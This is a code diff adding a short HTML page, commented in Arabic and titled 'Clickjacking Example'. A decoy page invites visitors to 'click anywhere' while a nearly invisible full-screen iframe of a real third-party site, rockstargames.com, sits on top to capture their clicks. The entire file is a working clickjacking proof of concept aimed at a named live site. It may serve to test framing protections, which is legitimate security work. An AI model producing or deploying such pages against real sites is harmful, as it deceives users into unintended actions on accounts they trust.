@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Clickjacking Example</title>
+    <style>
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0.01; /* يجعل الإطار شبه غير مرئي */
+            z-index: 9999; /* يجعله فوق جميع العناصر الأخرى */
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to Safe Site</h1>
+    <p>Feel free to click anywhere!</p>
+
+    <!-- إطار يحتوي على الموقع المستهدف -->
+    <iframe src="http://rockstargames.com:80/" frameborder="0"></iframe>
+</body>
+</html>
